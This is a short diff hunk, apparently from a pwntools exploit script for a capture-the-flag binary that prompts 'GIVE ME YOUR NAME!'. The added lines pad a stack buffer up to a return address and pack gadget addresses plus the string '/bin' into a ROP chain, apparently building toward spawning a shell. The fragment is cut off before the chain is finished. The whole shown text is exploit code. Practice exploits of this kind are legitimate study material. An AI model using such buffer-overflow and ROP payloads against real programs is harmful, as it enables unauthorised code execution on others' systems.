@@ -12,4 +12,8 @@ ret = 0xffffd52c
 r.recvuntil('GIVE ME YOUR NAME!\n')
 
 payload += 'a' * (ret - stack_start)
-payload
+payload += p32(0x0809cd71)
+payload += p32(int('/bin'.encode('hex'), 16))
+payload += p32(0x0806f19a)
+
+
